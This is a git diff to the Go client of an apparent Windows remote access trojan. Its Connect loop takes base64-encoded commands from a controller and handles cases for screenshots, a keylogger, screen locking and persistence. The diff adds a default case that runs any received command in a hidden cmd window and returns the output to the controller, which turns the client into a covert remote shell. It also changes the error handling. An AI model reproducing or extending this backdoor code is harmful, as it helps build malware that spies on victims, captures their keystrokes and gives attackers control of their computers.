@@ -3,6 +3,7 @@ package work
 import (
 	"bufio"
 	"encoding/base64"
+	"fmt"
 	"generate/pool/osinfo"
 	"generate/pool/persistence"
 	"golang.org/x/sys/windows/registry"
@@ -65,14 +66,18 @@ func Connect() {
 		// When the command received aren't encoded,
 		// skip switch, and be executed on OS shell.
 		command, _ := bufio.NewReader(conn).ReadString('\n')
-		// log.Println(command)
+		log.Println(command)
 
 		// When the command received are encoded,
 		// decode message received, and test on switch
 		decodedCommand, _ := base64.StdEncoding.DecodeString(command)
-		// log.Println(decodedCommand)
+		log.Println(decodedCommand)
 
 		switch string(decodedCommand) {
+		default:
+			fmt.Println(string(decodedCommand))
+			SendMessage(conn, EncodeBytesToString(RunCmdReturnByte(string(decodedCommand))))
+			//RemoveNewLineCharFromConnection(conn)
 
 		case "back":
 			conn.Close()
@@ -84,7 +89,7 @@ func Connect() {
 
 		case "screenshot":
 			SendMessage(conn, EncodeBytesToString(TakeScreenShot()))
-			RemoveNewLineCharFromConnection(conn)
+			//RemoveNewLineCharFromConnection(conn)
 
 		case "keylogger_start":
 			go Keylogger() // Run a go routine for Keylogger function
@@ -120,10 +125,6 @@ func Connect() {
 		case "lockscreen":
 			log.Println(RunCmdReturnByte("rundll32.exe user32.dll,LockWorkStation"))
 			SendMessage(conn, "[i] Locked!")
-			RemoveNewLineCharFromConnection(conn)
-
-		case "ls":
-			SendMessage(conn, EncodeBytesToString(RunCmdReturnByte("dir")))
 			RemoveNewLineCharFromConnection(conn)
 
 		case "persistence_enable":
@@ -170,14 +171,6 @@ func Connect() {
 			SendMessage(conn, "[*] Opened!")
 			RemoveNewLineCharFromConnection(conn)
 		} // end switch
-
-		SendMessage(conn, RunCmdReturnString(command))
-
-		_, err := conn.Read(make([]byte, 0))
-
-		if err != nil {
-			Connect()
-		}
 	}
 }
 
@@ -225,7 +218,10 @@ func RemoveNewLineCharFromConnection(conn net.Conn) {
 func RunCmdReturnByte(cmd string) []byte {
 	cmdExec := exec.Command("cmd", "/C", cmd)
 	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	c, _ := cmdExec.Output()
+	c, err := cmdExec.Output()
+	if err != nil {
+		return []byte(err.Error())
+	}
 	return c
 }
 
